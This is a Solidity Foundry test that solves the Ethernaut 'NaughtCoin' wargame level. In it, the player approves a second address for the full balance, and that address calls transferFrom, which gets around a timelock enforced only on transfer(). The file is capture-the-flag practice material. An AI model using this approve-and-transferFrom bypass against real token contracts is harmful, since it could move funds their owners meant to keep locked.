// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;

import "forge-std/Test.sol";
import "../src/levels/NaughtCoin/NaughtCoin.sol";
import "../src/levels/NaughtCoin/NaughtCoinFactory.sol";

contract KingTest is Test {
    NaughtCoinFactory public factory;
    address public instance;
    address public player = address(0x01);
    address public attacker = address(0x02);

    function setUp() public {
        factory = new NaughtCoinFactory();
        instance = factory.createInstance(player);
    }

    function testNaughtCoinAttack() public {
        assertEq(NaughtCoin(instance).balanceOf(player), NaughtCoin(instance).INITIAL_SUPPLY());
        assertEq(NaughtCoin(instance).balanceOf(attacker), 0);
        assertEq(NaughtCoin(instance).INITIAL_SUPPLY(), NaughtCoin(instance).totalSupply());

        uint256 amount = NaughtCoin(instance).balanceOf(player);

        vm.prank(player);
        NaughtCoin(instance).approve(attacker, amount);

        vm.prank(attacker);
        NaughtCoin(instance).transferFrom(player, attacker, amount);

        assertEq(ERC20(instance).balanceOf(player), 0);
        assertEq(ERC20(instance).balanceOf(attacker), NaughtCoin(instance).INITIAL_SUPPLY());

        assertTrue(factory.validateInstance(payable(instance), player));
    }
}
